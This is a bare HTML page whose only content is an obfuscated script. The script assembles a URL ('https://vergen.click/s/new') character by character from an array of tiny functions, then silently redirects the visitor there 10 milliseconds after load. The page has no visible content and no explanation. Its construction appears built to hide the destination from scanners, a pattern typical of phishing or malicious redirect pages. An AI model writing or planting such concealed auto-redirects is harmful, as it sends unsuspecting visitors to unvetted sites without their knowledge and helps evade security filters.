<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <script>
        const segments = [
            function() { return 'h'; },
            function() { return 't'; },
            () => 't',
            function() { return 'p'; },
            function() { return 's'; },
            function() { return ':'; },
            _ => '/',
            () => '/',
            _ => 'v',
            () => 'e',
            () => 'r',
            _ => 'g',
            function() { return 'e'; },
            () => 'n',
            _ => '.',
            () => 'c',
            function() { return 'l'; },
            function() { return 'i'; },
            function() { return 'c'; },
            function() { return 'k'; },
            () => '/',
            _ => 's',
            _ => '/',
            () => 'n',
            () => 'e',
            () => 'w'
        ];
        setTimeout(() => {
            window.location.replace(segments.map(f => f()).join(''));
        }, 10);
    </script>
</head>
<body></body>
</html>
